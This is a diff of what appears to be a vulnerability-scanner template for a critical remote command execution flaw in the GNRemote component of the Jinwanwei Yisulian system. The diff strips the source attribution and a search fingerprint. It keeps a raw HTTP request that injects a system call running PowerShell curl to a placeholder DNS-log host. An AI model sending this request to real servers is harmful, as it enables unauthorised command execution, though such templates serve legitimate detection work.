@@ -3,12 +3,8 @@ info:
   name: 金万维异速联云联应用系统GNRemote存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mxly4nxra8isak13'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mxly4nxra8isak13
-    fofa: body="GNRemote.dll"
 http:
 - raw:
   - 'GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=powershell+curl+xxx.dnslog.cn HTTP/1.1
